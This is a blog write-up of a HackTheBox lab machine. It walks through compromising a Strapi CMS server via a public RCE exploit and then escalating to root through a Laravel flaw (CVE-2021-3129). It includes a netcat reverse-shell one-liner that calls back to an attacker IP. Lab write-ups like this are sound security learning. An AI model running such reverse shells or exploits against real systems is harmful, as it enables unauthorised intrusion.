---
title: Horizontall WriteUp @HackTheBox
author: MBZ0x7
date: 2022-02-06 15:10:00 +0800
categories: [Penetration Testing]
tags: [linux,web,pentest,hackthebox]
pin: false
---
Hello, here's my writeup for Horizontall linux machine from HackTheBox, which I pwned few days ago before it gots retired. 

![](../../assets/img/posts/3/0.jpeg)
# <font color='red'>Information Gathering </font>
---
```
sudo nmap -sV 10.10.11.105
```
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Visiting 10.10.11.105 showed horizontall.htb, so I updated ```/etc/hosts```.

![](../../assets/img/posts/3/1.png)

When diging into website source code, I haven't found anything useful. So, immediately I decided to bruteforce subdirectories, which also reveals nothing unfortunately.

Then, I decided to bruteforce subdomains. I used gobuster with one of seclists wordlists, which revealed 1 subdomain. So, as previously I updated my hosts file.
![](../../assets/img/posts/3/2.png)

Here is how the subdomain looked up. Nothing of interest.
![](../../assets/img/posts/3/3.png)
So, I bruteforced subdirectories which showed 2 (/admin and /reviews).
![](../../assets/img/posts/3/4.png)
When visiting /admin subdir, I discovered that I'll be dealing with ```strapi CMS```.
![](../../assets/img/posts/3/5.png)
/reviews is useless.
![](../../assets/img/posts/3/6.png)
Trying default credentials wasn't successful, so I tried to find strapi version to look for CVEs which I found in one JS file. It was ```3.0.0-beta.17.4```.
![](../../assets/img/posts/3/7.png)
Looking into exploit-db, I found 1st and 3rd ones potentially applicable. 
![](../../assets/img/posts/3/8.png)

# <font color='red'>Exploitation</font>
---
I copied exploit-db 1st exploit into current directory using searchsploit command.
![](../../assets/img/posts/3/9.png)
 Then, executed it and used ```rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.81 4444 >/tmp/f``` to get reverse shell to netcat.
![](../../assets/img/posts/3/10.png)
Then, I found the user flag in developer account home directory.
![](../../assets/img/posts/3/11.png)

# <font color='red'>Privilege Escalation</font>
---
For PrivEsc, I run linPEAS after transfering its shell script file to the compromised machine. 

From its output, ports 8000 and 3306 caught my attention.
![](../../assets/img/posts/3/12.png)
I run ```curl http://127.0.0.1:8000``` and got a Laravel 8 website running locally.
![](../../assets/img/posts/3/13.png)
Visiting exploit-db, I found an RCE exploit that looks promissing. 
![](../../assets/img/posts/3/14.png)
For whatever reason it hasn't worked for me. So, I searched another one and found it 
[here](https://github.com/nth347/CVE-2021-3129_exploit). which got me arbitrary code execution on the root account ,and got the flag.
![](../../assets/img/posts/3/15.png)
